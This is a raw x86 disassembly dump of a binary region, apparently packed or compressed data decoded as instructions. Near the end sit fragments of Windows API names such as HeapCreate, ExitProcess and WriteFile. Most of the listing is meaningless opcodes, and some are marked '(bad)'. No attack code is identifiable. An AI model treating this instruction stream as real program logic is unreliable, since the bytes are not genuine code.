  41056f:	99                   	cltd
  410570:	09 12                	or     %edx,(%edx)
  410572:	2f                   	das
  410573:	48                   	dec    %eax
  410574:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  410575:	77 35                	ja     0x4105ac
  410577:	64 6a 93             	fs push $0xffffff93
  41057a:	5b                   	pop    %ebx
  41057b:	1c 70                	sbb    $0x70,%al
  41057d:	14 73                	adc    $0x73,%al
  41057f:	93                   	xchg   %eax,%ebx
  410580:	15 f1 b8 fa cf       	adc    $0xcffab8f1,%eax
  410585:	b4 0e                	mov    $0xe,%ah
  410587:	55                   	push   %ebp
  410588:	26 6f                	outsl  %es:(%esi),(%dx)
  41058a:	bc 73 27 24 81       	mov    $0x81242773,%esp
  41058f:	43                   	inc    %ebx
  410590:	12 39                	adc    (%ecx),%bh
  410592:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  410593:	d2 4a 1c             	rorb   %cl,0x1c(%edx)
  410596:	ee                   	out    %al,(%dx)
  410597:	ec                   	in     (%dx),%al
  410598:	bf 24 81 13 b8       	mov    $0xb8138124,%edi
  41059d:	5f                   	pop    %edi
  41059e:	bb 0e 0b 6f 8c       	mov    $0x8c6f0b0e,%ebx
  4105a3:	22 77 ee             	and    -0x12(%edi),%dh
  4105a6:	8c 64 35 ce          	mov    %fs,-0x32(%ebp,%esi,1)
  4105aa:	79 12                	jns    0x4105be
  4105ac:	35 c0 46 1d 93       	xor    $0x931d46c0,%eax
  4105b1:	f4                   	hlt
  4105b2:	df b2 8f 6f 14 b8    	fbstp  -0x47eb9071(%edx)
  4105b8:	68 ec 1b 89 e0       	push   $0xe0891bec
  4105bd:	c5 73 5f             	lds    0x5f(%ebx),%esi
  4105c0:	27                   	daa
  4105c1:	73 26                	jae    0x4105e9
  4105c3:	39 d3                	cmp    %edx,%ebx
  4105c5:	d8 8a b3 12 39 14    	fmuls  0x143912b3(%edx)
  4105cb:	ff 92 bd 63 fb d9    	call   *-0x26049c43(%edx)
  4105d1:	c1 6f 13 b8          	shrl   $0xb8,0x13(%edi)
  4105d5:	37                   	aaa
  4105d6:	9d                   	popf
  4105d7:	5c                   	pop    %esp
  4105d8:	02 c9                	add    %cl,%cl
  4105da:	dc 59 6f             	fcompl 0x6f(%ecx)
  4105dd:	fc                   	cld
  4105de:	22 35 30 6f d9 3b    	and    0x3bd96f30,%dh
  4105e4:	77 e9                	ja     0x4105cf
  4105e6:	12 35 c5 46 8a 56    	adc    0x568a46c5,%dh
  4105ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4105ed:	14 b8                	adc    $0xb8,%al
  4105ef:	02 26                	add    (%esi),%ah
  4105f1:	fb                   	sti
  4105f2:	b8 41 a6 b0 d6       	mov    $0xd6b0a641,%eax
  4105f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4105f8:	35 41 77 ee 84       	xor    $0x84ee7741,%eax
  4105fd:	21 19                	and    %ebx,(%ecx)
  4105ff:	f5                   	cmc
  410600:	23 12                	and    (%edx),%edx
  410602:	39 04 b3             	cmp    %eax,(%ebx,%esi,4)
  410605:	2b 90 fe 25 81 67    	sub    0x678125fe(%eax),%edx
  41060b:	30 13                	xor    %dl,(%ebx)
  41060d:	b8 96 cb 43 08       	mov    $0x843cb96,%eax
  410612:	3b 21                	cmp    (%ecx),%esp
  410614:	09 6e 6b             	or     %ebp,0x6b(%esi)
  410617:	22 f5                	and    %ch,%dh
  410619:	15 59 12 bf 24       	adc    $0x24bf1259,%eax
  41061e:	d4 9d                	aam    $0x9d
  410620:	35 03 da 5f 4c       	xor    $0x4c5fda03,%eax
  410625:	13 b8 67 27 73 83    	adc    -0x7c8cd899(%eax),%edi
  41062b:	c0 41 33 30          	rolb   $0x30,0x33(%ecx)
  41062f:	a1 22 a5 d3 dc       	mov    0xdcd3a522,%eax
  410634:	c9                   	leave
  410635:	de b9 86 04 bb 8f    	fidivrs -0x7044fb7a(%ecx)
  41063b:	12 35 3b 49 4b b6    	adc    0xb64b493b,%dh
  410641:	db ee                	fucomi %st(6),%st
  410643:	0c a2                	or     $0xa2,%al
  410645:	7f 13                	jg     0x41065a
  410647:	b8 8a 2c f4 19       	mov    $0x19f42c8a,%eax
  41064c:	d7                   	xlat   %ds:(%ebx)
  41064d:	22 ef                	and    %bh,%ch
  41064f:	dc bb 64 35 a1 1b    	fdivrl 0x1ba13564(%ebx)
  410655:	87 05 c5 12 35 1d    	xchg   %eax,0x1d3512c5
  41065b:	97                   	xchg   %eax,%edi
  41065c:	f9                   	stc
  41065d:	93                   	xchg   %eax,%ebx
  41065e:	67 c5 bf 64 a1       	lds    -0x5e9c(%bx),%edi
  410663:	13 b8 3b f8 66 18    	adc    0x1866f83b(%eax),%edi
  410669:	0d 4d 34 49 b9       	or     $0xb949344d,%eax
  41066e:	e0 f5                	loopne 0x410665
  410670:	d2 20                	shlb   %cl,(%eax)
  410672:	fc                   	cld
  410673:	fb                   	sti
  410674:	4b                   	dec    %ebx
  410675:	46                   	inc    %esi
  410676:	c4 67 35             	les    0x35(%edi),%esp
  410679:	8f a9 f5 4e          	(bad)
  41067d:	13 21                	adc    (%ecx),%esp
  41067f:	bc 13 fe b8 95       	mov    $0x95b8fe13,%esp
  410684:	10 20                	adc    %ah,(%eax)
  410686:	dd b7 43 35 0d 64    	fnsave 0x640d3543(%edi)
  41068c:	ef                   	out    %eax,(%dx)
  41068d:	5c                   	pop    %esp
  41068e:	f7 d3                	not    %ebx
  410690:	ea 16 a1 31 12 6b 66 	ljmp   $0x666b,$0x1231a116
  410697:	a3 0c e7 a1 64       	mov    %eax,0x64a1e70c
  41069c:	ee                   	out    %al,(%dx)
  41069d:	ec                   	in     (%dx),%al
  41069e:	bf 13 b8 d6 03       	mov    $0x3d6b813,%edi
  4106a3:	9b                   	fwait
  4106a4:	ea 35 7a 22 a1 77 6e 	ljmp   $0x6e77,$0xa1227a35
  4106ab:	04 80                	add    $0x80,%al
  4106ad:	fc                   	cld
  4106ae:	67 12 35             	adc    (%di),%dh
  4106b1:	6a ed                	push   $0xffffffed
  4106b3:	10 e1                	adc    %ah,%cl
  4106b5:	bf 60 b8 95 87       	mov    $0x8795b860,%edi
  4106ba:	5d                   	pop    %ebp
  4106bb:	14 b8                	adc    $0xb8,%al
  4106bd:	b0 49                	mov    $0x49,%al
  4106bf:	2f                   	das
  4106c0:	5c                   	pop    %esp
  4106c1:	7d 93                	jge    0x410656
  4106c3:	92                   	xchg   %eax,%edx
  4106c4:	e0 26                	loopne 0x4106ec
  4106c6:	b4 26                	mov    $0x26,%ah
  4106c8:	47                   	inc    %edi
  4106c9:	07                   	pop    %es
  4106ca:	5b                   	pop    %ebx
  4106cb:	06                   	push   %es
  4106cc:	dc b9 a1 12 39 a0    	fdivrl -0x5fc6ed5f(%ecx)
  4106d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4106d3:	92                   	xchg   %eax,%edx
  4106d4:	6e                   	outsb  %ds:(%esi),(%dx)
  4106d5:	14 93                	adc    $0x93,%al
  4106d7:	b9 c9 fe b8 1d       	mov    $0x1db8fec9,%ecx
  4106dc:	11 1f                	adc    %ebx,(%edi)
  4106de:	68 39 ed 26 39       	push   $0x3926ed39
  4106e3:	d3 92 bd 73 dd e0    	rcll   %cl,-0x1f228c43(%edx)
  4106e9:	15 a9 db 12 39       	adc    $0x3912dba9,%eax
  4106ee:	25 cf 51 b5 a9       	and    $0xa9b551cf,%eax
  4106f3:	00 0c 42             	add    %cl,(%edx,%eax,2)
  4106f6:	ff 13                	call   *(%ebx)
  4106f8:	b8 e6 0b de b6       	mov    $0xb6de0be6,%eax
  4106fd:	23 ce                	and    %esi,%ecx
  4106ff:	75 27                	jne    0x410728
  410701:	73 50                	jae    0x410753
  410703:	df fa                	(bad)
  410705:	14 35                	adc    $0x35,%al
  410707:	11 12                	adc    %edx,(%edx)
  410709:	35 08 fd 4b f2       	xor    $0xf24bfd08,%eax
  41070e:	53                   	push   %ebx
  41070f:	04 a6                	add    $0xa6,%al
  410711:	53                   	push   %ebx
  410712:	13 b8 64 a2 19 b6    	adc    -0x49e65d9c(%eax),%edi
  410718:	f7 70 32             	divl   0x32(%eax)
  41071b:	37                   	aaa
  41071c:	59                   	pop    %ecx
  41071d:	22 df                	and    %bh,%bl
  41071f:	d3 24 b7             	shll   %cl,(%edi,%esi,4)
  410722:	47                   	inc    %edi
  410723:	12 f1                	adc    %cl,%dh
  410725:	2f                   	das
  410726:	c9                   	leave
  410727:	3b 35 43 5c 98 3f    	cmp    0x3f985c43,%esi
  41072d:	13 b8 01 20 0b 90    	adc    -0x6ff4dfff(%eax),%edi
  410733:	cc                   	int3
  410734:	9d                   	popf
  410735:	01 8f 8f 22 35 f0    	add    %ecx,-0xfcadd71(%edi)
  41073b:	ce                   	into
  41073c:	8d 11                	lea    (%ecx),%edx
  41073e:	d1 7d 12             	sarl   $1,0x12(%ebp)
  410741:	35 52 0d 26 ef       	xor    $0xef260d52,%eax
  410746:	ee                   	out    %al,(%dx)
  410747:	84 ff                	test   %bh,%bh
  410749:	92                   	xchg   %eax,%edx
  41074a:	b7 13                	mov    $0x13,%bh
  41074c:	b8 cb aa fa 30       	mov    $0x30faaacb,%eax
  410751:	4b                   	dec    %ebx
  410752:	c5 22                	lds    (%edx),%esp
  410754:	9d                   	popf
  410755:	7b e0                	jnp    0x410737
  410757:	64 35 d3 b8 27 b3    	fs xor $0xb327b8d3,%eax
  41075d:	12 35 b5 9d fd 97    	adc    0x97fd9db5,%dh
  410763:	ec                   	in     (%dx),%al
  410764:	62 2f                	bound  %ebp,(%edi)
  410766:	3e 6b 13 b8          	imul   $0xffffffb8,%ds:(%ebx),%edx
  41076a:	88 4d 00             	mov    %cl,0x0(%ebp)
  41076d:	d6                   	salc
  41076e:	35 fb 77 ee b9       	xor    $0xb9ee77fb,%eax
  410773:	cc                   	int3
  410774:	22 35 82 e9 12 35    	and    0x3512e982,%dh
  41077a:	0d b2 6c 78 f6       	or     $0xf6786cb2,%eax
  41077f:	5f                   	pop    %edi
  410780:	92                   	xchg   %eax,%edx
  410781:	70 13                	jo     0x410796
  410783:	b8 e3 88 a0 75       	mov    $0x75a088e3,%eax
  410788:	35 31 e2 e7 9a       	xor    $0x9ae7e231,%eax
  41078d:	93                   	xchg   %eax,%ebx
  41078e:	60                   	pusha
  41078f:	9b                   	fwait
  410790:	0d 9c 00 1f 12       	or     $0x121f009c,%eax
  410795:	35 67 ff 25 79       	xor    $0x7925ff67,%eax
  41079a:	87 9f 92 35 13 b8    	xchg   %ebx,-0x47ecca6e(%edi)
  4107a0:	cd 0e                	int    $0xe
  4107a2:	42                   	inc    %edx
  4107a3:	ec                   	in     (%dx),%al
  4107a4:	35 67 dc 59 25       	xor    $0x2559dc67,%eax
  4107a9:	73 22                	jae    0x4107cd
  4107ab:	6b 46 55 12          	imul   $0x12,0x55(%esi),%eax
  4107af:	5f                   	pop    %edi
  4107b0:	92                   	xchg   %eax,%edx
  4107b1:	2a ee                	sub    %dh,%ch
  4107b3:	35 7e d2 ae db       	xor    $0xdbaed27e,%eax
  4107b8:	13 b8 99 3b 0b e0    	adc    -0x1ff4c467(%eax),%edi
  4107be:	fa                   	cli
  4107bf:	fa                   	cli
  4107c0:	1d 96 9d 22 35       	sbb    $0x35229d96,%eax
  4107c5:	d9 3b                	fnstcw (%ebx)
  4107c7:	d7                   	xlat   %ds:(%ebx)
  4107c8:	3d d3 20 02 6b       	cmp    $0x6b0220d3,%eax
  4107cd:	8b 12                	mov    (%edx),%edx
  4107cf:	35 2f f4 28 33       	xor    $0x3328f42f,%eax
  4107d4:	6b dc 09             	imul   $0x9,%esp,%ebx
  4107d7:	f4                   	hlt
  4107d8:	2f                   	das
  4107d9:	13 b8 ec df be 50    	adc    0x50bedfec(%eax),%edi
  4107df:	d3 22                	shll   %cl,(%edx)
  4107e1:	3b d7                	cmp    %edi,%edx
  4107e3:	c1 cb 35             	ror    $0x35,%ebx
  4107e6:	fa                   	cli
  4107e7:	fe                   	(bad)
  4107e8:	dc c1                	fadd   %st,%st(1)
  4107ea:	12 35 a2 9e 01 f0    	adc    0xf0019ea2,%dh
  4107f0:	2f                   	das
  4107f1:	c9                   	leave
  4107f2:	c1 c5 13             	rol    $0x13,%ebp
  4107f5:	b8 a2 ad 27 9b       	mov    $0x9b27ada2,%eax
  4107fa:	cc                   	int3
  4107fb:	04 9c                	add    $0x9c,%al
  4107fd:	2a 09                	sub    (%ecx),%cl
  4107ff:	e1 d7                	loope  0x4107d8
  410801:	14 6b                	adc    $0x6b,%al
  410803:	c9                   	leave
  410804:	8a f8                	mov    %al,%bh
  410806:	ec                   	in     (%dx),%al
  410807:	f7 35 fa 82 2d 30    	divl   0x302d82fa
  41080d:	09 1b                	or     %ebx,(%ebx)
  41080f:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  410810:	7f 13                	jg     0x410825
  410812:	b8 66 79 5d 67       	mov    $0x675d7966,%eax
  410817:	3f                   	aas
  410818:	35 92 bc 73 dd       	xor    $0xdd73bc92,%eax
  41081d:	8e ff                	mov    %edi,%?
  41081f:	6b 2d 12 6b 45 7c a3 	imul   $0xffffffa3,0x7c456b12,%ebp
  410826:	3a 73 27             	cmp    0x27(%ebx),%dh
  410829:	54                   	push   %esp
  41082a:	ff 13                	call   *(%ebx)
  41082c:	b8 76 c7 e7 21       	mov    $0x21e7c776,%eax
  410831:	75 22                	jne    0x410855
  410833:	a1 f2 ce 75 2f       	mov    0x2f75cef2,%eax
  410838:	48                   	dec    %eax
  410839:	01 d7                	add    %edx,%edi
  41083b:	63 12                	arpl   %edx,(%edx)
  41083d:	35 08 12 c7 a0       	xor    $0xa0c71208,%eax
  410842:	9d                   	popf
  410843:	14 fc                	adc    $0xfc,%al
  410845:	4b                   	dec    %ebx
  410846:	13 b8 b5 cb 1b 84    	adc    -0x7be4344b(%eax),%edi
  41084c:	ab                   	stos   %eax,%es:(%edi)
  41084d:	77 ee                	ja     0x41083d
  41084f:	bb cc 22 35 22       	mov    $0x223522cc,%ebx
  410854:	d7                   	xlat   %ds:(%ebx)
  410855:	99                   	cltd
  410856:	12 35 c1 4b 3e a4    	adc    0xa43e4bc1,%dh
  41085c:	e8 5f 92 e1 13       	call   0x14229ac0
  410861:	b8 a5 b8 6a 34       	mov    $0x346ab8a5,%eax
  410866:	73 df                	jae    0x410847
  410868:	65 ee                	gs out %al,(%dx)
  41086a:	e1 22                	loope  0x41088e
  41086c:	35 3c 6b cf 12       	xor    $0x12cf6b3c,%eax
  410871:	35 fa 97 04 b8       	xor    $0xb80497fa,%eax
  410876:	e2 bf                	loop   0x410837
  410878:	08 89 13 b8 b5 ca    	or     %cl,-0x354a47ed(%ecx)
  41087e:	1c 09                	sbb    $0x9,%al
  410880:	ae                   	scas   %es:(%edi),%al
  410881:	80 41 9d 17          	addb   $0x17,-0x63(%ecx)
  410885:	d1 0d 64 ef dc 37    	rorl   $1,0x37dcef64
  41088b:	b6 6b                	mov    $0x6b,%dh
  41088d:	05 12 35 ae 12       	add    $0x12ae3512,%eax
  410892:	5c                   	pop    %esp
  410893:	d0 6b 73             	shrb   $1,0x73(%ebx)
  410896:	27                   	daa
  410897:	c5 bf 13 b8 41 b5    	lds    -0x4abe47ed(%edi),%edi
  41089d:	1e                   	push   %ds
  41089e:	ff 50 22             	call   *0x22(%eax)
  4108a1:	6b e0 9d             	imul   $0xffffff9d,%eax,%esp
  4108a4:	fb                   	sti
  4108a5:	27                   	daa
  4108a6:	b2 24                	mov    $0x24,%dl
  4108a8:	e4 0f                	in     $0xf,%al
  4108aa:	87 05 3b 12 35 56    	xchg   %eax,0x5635123b
  4108b0:	46                   	inc    %esi
  4108b1:	76 98                	jbe    0x41084b
  4108b3:	01 ff                	add    %edi,%edi
  4108b5:	05 24 e4 16 b8       	add    $0xb816e424,%eax
  4108ba:	1e                   	push   %ds
  4108bb:	c5 36                	lds    (%esi),%esi
  4108bd:	61                   	popa
  4108be:	02 c9                	add    %cl,%cl
  4108c0:	dc 61 20             	fsubl  0x20(%ecx)
  4108c3:	8a 28                	mov    (%eax),%ch
  4108c5:	3b 8d 4b a2 3b 77    	cmp    0x773ba24b(%ebp),%ecx
  4108cb:	77 12                	ja     0x4108df
  4108cd:	3b f9                	cmp    %ecx,%edi
  4108cf:	ec                   	in     (%dx),%al
  4108d0:	30 ea                	xor    %ch,%dl
  4108d2:	cc                   	int3
  4108d3:	4d                   	dec    %ebp
  4108d4:	d2 7f 14             	sarb   %cl,0x14(%edi)
  4108d7:	b8 f5 a8 ab ba       	mov    $0xbaaba8f5,%eax
  4108dc:	d5 c3                	aad    $0xc3
  4108de:	26 39 bd 73 1f 9d a5 	cmp    %edi,%es:-0x5a62e08d(%ebp)
  4108e5:	30 be b1 12 39 41    	xor    %bh,0x413912b1(%esi)
  4108eb:	68 a8 7c 52 c4       	push   $0xc4527ca8
  4108f0:	bf 24 33 13 b8       	mov    $0xb8133324,%edi
  4108f5:	f2 9c                	repnz pushf
  4108f7:	fb                   	sti
  4108f8:	f0 35 bc 2c 77 f9    	lock xor $0xf9772cbc,%eax
  4108fe:	22 0b                	and    (%ebx),%cl
  410900:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  410901:	11 83 e7 97 04 ea    	adc    %eax,-0x15fb6819(%ebx)
  410907:	ce                   	into
  410908:	12 35 ae 90 6d 24    	adc    0x246d90ae,%dh
  41090e:	13 70 05             	adc    0x5(%eax),%esi
  410911:	67 fc                	addr16 cld
  410913:	b8 38 8b 6a fb       	mov    $0xfb6a8b38,%eax
  410918:	c7                   	(bad)
  410919:	2f                   	das
  41091a:	45                   	inc    %ebp
  41091b:	ef                   	out    %eax,(%dx)
  41091c:	dc 19                	fcompl (%ecx)
  41091e:	43                   	inc    %ebx
  41091f:	17                   	pop    %ss
  410920:	c7                   	(bad)
  410921:	1d 12 35 46 4a       	sbb    $0x4a463512,%eax
  410926:	d3 ab 06 c4 bf 64    	shrl   %cl,0x64bfc406(%ebx)
  41092c:	6b 13 b8             	imul   $0xffffffb8,(%ebx),%edx
  41092f:	ed                   	in     (%dx),%eax
  410930:	4a                   	dec    %edx
  410931:	b5 e9                	mov    $0xe9,%ch
  410933:	dc 59 32             	fcompl 0x32(%ecx)
  410936:	77 65                	ja     0x41099d
  410938:	22 6b 35             	and    0x35(%ebx),%ch
  41093b:	53                   	push   %ebx
  41093c:	12 97 cc 14 e4 35    	adc    0x35e414cc(%edi),%dl
  410942:	11 35 13 73 67 a7    	adc    %esi,0xa7677313
  410948:	a0 0f 6b 9c 22       	mov    0x229c6b0f,%al
  41094d:	d7                   	xlat   %ds:(%ebx)
  41094e:	e7 9e                	out    %eax,$0x9e
  410950:	88 26                	mov    %ah,(%esi)
  410952:	ea 14 89 12 35 bf 20 	ljmp   $0x20bf,$0x35128914
  410959:	60                   	pusha
  41095a:	7a 9e                	jp     0x4108fa
  41095c:	1a 5d a0             	sbb    -0x60(%ebp),%bl
  41095f:	85 21                	test   %esp,(%ecx)
  410961:	14 b8                	adc    $0xb8,%al
  410963:	d0 4e e6             	rorb   $1,-0x1a(%esi)
  410966:	26 e1 8b             	es loope 0x4108f4
  410969:	b7 4f                	mov    $0x4f,%bh
  41096b:	11 d5                	adc    %edx,%ebp
  41096d:	26 6f                	outsl  %es:(%esi),(%dx)
  41096f:	d3 44 e1 9d          	roll   %cl,-0x63(%ecx,%eiz,8)
  410973:	eb 02                	jmp    0x410977
  410975:	fa                   	cli
  410976:	c3                   	ret
  410977:	12 39                	adc    (%ecx),%bh
  410979:	54                   	push   %esp
  41097a:	2b 3d b0 bd 18 8c    	sub    0x8c18bdb0,%edi
  410980:	fe                   	(bad)
  410981:	25 13 b8 49 a7       	and    $0xa749b813,%eax
  410986:	80 f0 0c             	xor    $0xc,%al
  410989:	ac                   	lods   %ds:(%esi),%al
  41098a:	1a 66 00             	sbb    0x0(%esi),%ah
  41098d:	92                   	xchg   %eax,%edx
  41098e:	db 0c 4b             	fisttpl (%ebx,%ecx,2)
  410991:	56                   	push   %esi
  410992:	fd                   	std
  410993:	6c                   	insb   (%dx),%es:(%edi)
  410994:	f9                   	stc
  410995:	35 cf 56 ed 13       	xor    $0x13ed56cf,%eax
  41099a:	0c 14                	or     $0x14,%al
  41099c:	34 b0                	xor    $0xb0,%al
  41099e:	c9                   	leave
  41099f:	fe                   	(bad)
  4109a0:	b8 19 34 dc 6d       	mov    $0x6ddc3419,%eax
  4109a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4109a6:	45                   	inc    %ebp
  4109a7:	39 f6                	cmp    %esi,%esi
  4109a9:	ce                   	into
  4109aa:	8d 41 a0             	lea    -0x60(%ecx),%eax
  4109ad:	33 12                	xor    (%edx),%edx
  4109af:	6f                   	outsl  %ds:(%esi),(%dx)
  4109b0:	5d                   	pop    %ebp
  4109b1:	bf ee 11 df dc       	mov    $0xdcdf11ee,%edi
  4109b6:	60                   	pusha
  4109b7:	fd                   	std
  4109b8:	4b                   	dec    %ebx
  4109b9:	13 b8 ab f9 92 13    	adc    0x1392f9ab(%eax),%edi
  4109bf:	7c 22                	jl     0x4109e3
  4109c1:	ce                   	into
  4109c2:	8d 45 c9             	lea    -0x37(%ebp),%eax
  4109c5:	df 87 69 12 35 51    	filds  0x51351269(%edi)
  4109cb:	ff 96 f1 b3 5b bf    	call   *-0x40a44c0f(%esi)
  4109d1:	2b 9a 14 b8 84 c0    	sub    -0x3f7b47ec(%edx),%ebx
  4109d7:	bf e1 c9 dc 64       	mov    $0x64dcc9e1,%edi
  4109dc:	a1 b5 26 39 d3       	mov    0xd33926b5,%eax
  4109e1:	c4 12                	les    (%edx),%edx
  4109e3:	bb 5f b2 77 ae       	mov    $0xae77b25f,%ebx
  4109e8:	a3 12 39 1e 3e       	mov    %eax,0x3e1e3912
  4109ed:	d2 2c df             	shrb   %cl,(%edi,%ebx,8)
  4109f0:	13 b8 92 b9 93 e8    	adc    -0x176c466e(%eax),%edi
  4109f6:	37                   	aaa
  4109f7:	c3                   	ret
  4109f8:	97                   	xchg   %eax,%edi
  4109f9:	af                   	scas   %es:(%edi),%eax
  4109fa:	ec                   	in     (%dx),%al
  4109fb:	22 35 2d 7b e7 ce    	and    0xcee77b2d,%dh
  410a01:	6f                   	outsl  %ds:(%esi),(%dx)
  410a02:	d9 12                	fsts   (%edx)
  410a04:	35 36 79 ee 81       	xor    $0x81ee7936,%eax
  410a09:	6f                   	outsl  %ds:(%esi),(%dx)
  410a0a:	70 b2                	jo     0x4109be
  410a0c:	82 fe 14             	cmp    $0x14,%dh
  410a0f:	b8 a6 14 18 5c       	mov    $0x5c1814a6,%eax
  410a14:	25 e7 ce 7d 0f       	and    $0xf7dcee7,%eax
  410a19:	c1 6d 19 d3          	shrl   $0xd3,0x19(%ebp)
  410a1d:	42                   	inc    %edx
  410a1e:	6f                   	outsl  %ds:(%esi),(%dx)
  410a1f:	13 12                	adc    (%edx),%edx
  410a21:	39 04 dd 4b f6 ff 30 	cmp    %eax,0x30fff64b(,%ebx,8)
  410a28:	b9 bb 6f 13 38       	mov    $0x38136fbb,%ecx
  410a2d:	44                   	inc    %esp
  410a2e:	f7 2f                	imull  (%edi)
  410a30:	73 27                	jae    0x410a59
  410a32:	a8 5d                	test   $0x5d,%al
  410a34:	22 6f 64             	and    0x64(%edi),%ch
  410a37:	c5 f7 87             	(bad)
  410a3a:	05 49 12 5b 06       	add    $0x65b1249,%eax
  410a3f:	d1 3b                	sarl   $1,(%ebx)
  410a41:	35 24 3c 3b 18       	xor    $0x183b3c24,%eax
  410a46:	66 15 99 9b          	adc    $0x9b99,%ax
  410a4a:	8c fe                	mov    %?,%esi
  410a4c:	b8 37 ee 22 28       	mov    $0x2822ee37,%eax
  410a51:	f8                   	clc
  410a52:	97                   	xchg   %eax,%edi
  410a53:	27                   	daa
  410a54:	3a 3b                	cmp    (%ebx),%bh
  410a56:	d7                   	xlat   %ds:(%ebx)
  410a57:	40                   	inc    %eax
  410a58:	74 6d                	je     0x410ac7
  410a5a:	7d 84                	jge    0x4109e0
  410a5c:	12 3a                	adc    (%edx),%bh
  410a5e:	b4 2d                	mov    $0x2d,%ah
  410a60:	49                   	dec    %ecx
  410a61:	f8                   	clc
  410a62:	6f                   	outsl  %ds:(%esi),(%dx)
  410a63:	d9 a5 c6 aa 14 b8    	fldenv -0x47eb553a(%ebp)
  410a69:	5d                   	pop    %ebp
  410a6a:	bf 07 14 8a b9       	mov    $0xb98a1407,%edi
  410a6f:	b3 24                	mov    $0x24,%bl
  410a71:	b8 d1 26 fa e4       	mov    $0xe4fa26d1,%eax
  410a76:	be 12 d9 7f 4b       	mov    $0x4b7fd912,%esi
  410a7b:	de 39                	fidivrs (%ecx)
  410a7d:	c5 a7 31 39 14 b8    	lds    -0x47ebc6cf(%edi),%esp
  410a83:	bf 63 c0 fb 39       	mov    $0x39fbc063,%edi
  410a88:	cf                   	iret
  410a89:	fe 01                	incb   (%ecx)
  410a8b:	3b 0b                	cmp    (%ebx),%ecx
  410a8d:	e8 e4 ea f5 5f       	call   0x6036f576
  410a92:	52                   	push   %edx
  410a93:	87 05 f8 39 9b 3c    	xchg   %eax,0x3c9b39f8
  410a99:	bf 20 80 8b dd       	mov    $0xdd8b8020,%edi
  410a9e:	05 99 14 b8 ad       	add    $0xadb81499,%eax
  410aa3:	2a 33                	sub    (%ebx),%dh
  410aa5:	15 ec b8 0f 13       	adc    $0x130fb8ec,%eax
  410aaa:	39 c1                	cmp    %eax,%ecx
  410aac:	02 ff                	add    %bh,%bh
  410aae:	26 86 a0 d5 e7 2c 42 	xchg   %ah,%es:0x422ce7d5(%eax)
  410ab5:	00 00                	add    %al,(%eax)
  410ab7:	01 47 65             	add    %eax,0x65(%edi)
  410aba:	74 b3                	je     0x410a6f
  410abc:	ff                   	(bad)
  410abd:	ff                   	(bad)
  410abe:	ff 4d 6f             	decl   0x6f(%ebp)
  410ac1:	64 75 6c             	fs jne 0x410b30
  410ac4:	65 48                	gs dec %eax
  410ac6:	61                   	popa
  410ac7:	6e                   	outsb  %ds:(%esi),(%dx)
  410ac8:	64 6c                	fs insb (%dx),%es:(%edi)
  410aca:	65 41                	gs inc %ecx
  410acc:	00 01                	add    %al,(%ecx)
  410ace:	48                   	dec    %eax
  410acf:	65 61                	gs popa
  410ad1:	70 43                	jo     0x410b16
  410ad3:	72 65                	jb     0x410b3a
  410ad5:	61                   	popa
  410ad6:	74 65                	je     0x410b3d
  410ad8:	0b 3f                	or     (%edi),%edi
  410ada:	f6 ff                	idiv   %bh
  410adc:	ff 44 65 73          	incl   0x73(%ebp,%eiz,2)
  410ae0:	74 72                	je     0x410b54
  410ae2:	6f                   	outsl  %ds:(%esi),(%dx)
  410ae3:	79 00                	jns    0x410ae5
  410ae5:	01 45 78             	add    %eax,0x78(%ebp)
  410ae8:	69 74 50 72 6f 63 65 	imul   $0x7365636f,0x72(%eax,%edx,2),%esi
  410aef:	73 
  410af0:	73 37                	jae    0x410b29
  410af2:	43                   	inc    %ebx
  410af3:	75 72                	jne    0x410b67
  410af5:	72 65                	jb     0x410b5c
  410af7:	f6 3f                	idivb  (%edi)
  410af9:	76 f7                	jbe    0x410af2
  410afb:	6e                   	outsb  %ds:(%esi),(%dx)
  410afc:	74 54                	je     0x410b52
  410afe:	68 2c 64 49 64       	push   $0x6449642c
  410b03:	13 54 69 63          	adc    0x63(%ecx,%ebp,2),%edx
  410b07:	6b 43 6f 75          	imul   $0x75,0x6f(%ebx),%eax
  410b0b:	6e                   	outsb  %ds:(%esi),(%dx)
  410b0c:	74 3b                	je     0x410b49
  410b0e:	f1                   	int1
  410b0f:	dd 67 7f             	frstor 0x7f(%edi)
  410b12:	41                   	inc    %ecx
  410b13:	6c                   	insb   (%dx),%es:(%edi)
  410b14:	6c                   	insb   (%dx),%es:(%edi)
  410b15:	6f                   	outsl  %ds:(%esi),(%dx)
  410b16:	63 0a                	arpl   %ecx,(%edx)
  410b18:	46                   	inc    %esi
  410b19:	72 65                	jb     0x410b80
  410b1b:	50                   	push   %eax
  410b1c:	57                   	push   %edi
  410b1d:	72 69                	jb     0x410b88
  410b1f:	74 65                	je     0x410b86
  410b21:	17                   	pop    %ss
  410b22:	ec                   	in     (%dx),%al
  410b23:	77 01                	ja     0x410b26
  410b25:	27                   	daa
  410b26:	00 01                	add    %al,(%ecx)
  410b28:	43                   	inc    %ebx
  410b29:	6c                   	insb   (%dx),%es:(%edi)
  410b2a:	6f                   	outsl  %ds:(%esi),(%dx)
  410b2b:	73 75                	jae    0x410ba2
  410b2d:	0c fe                	or     $0xfe,%al
  410b2f:	9c                   	pushf
  410b30:	9b                   	fwait
  410b31:	39 43 18             	cmp    %eax,0x18(%ebx)
  410b34:	81 93 22 53 69 7a ff 	adcl   $0xef7fdfff,0x7a695322(%ebx)
  410b3b:	df 7f ef 
  410b3e:	31 52 65             	xor    %edx,0x65(%edx)
  410b41:	61                   	popa
  410b42:	64 0d 00 01 53 65    	fs or  $0x65530100,%eax
  410b48:	74 08                	je     0x410b52
  410b4a:	50                   	push   %eax
  410b4b:	6f                   	outsl  %ds:(%esi),(%dx)
  410b4c:	69 6e 74 65 72 00 01 	imul   $0x1007265,0x74(%esi),%ebp
  410b53:	88 bf eb fe 49 6e    	mov    %bh,0x6e49feeb(%edi)
  410b59:	69 74 69 61 6c 25 43 	imul   $0x5543256c,0x61(%ecx,%ebp,2),%esi
  410b60:	55 
  410b61:	69 63 61 6c 53 65 63 	imul   $0x6365536c,0x61(%ebx),%esp
  410b68:	ef                   	out    %eax,(%dx)
  410b69:	6f                   	outsl  %ds:(%esi),(%dx)
  410b6a:	d9 0b                	(bad) (%ebx)
  410b6c:	c4                   	(bad)
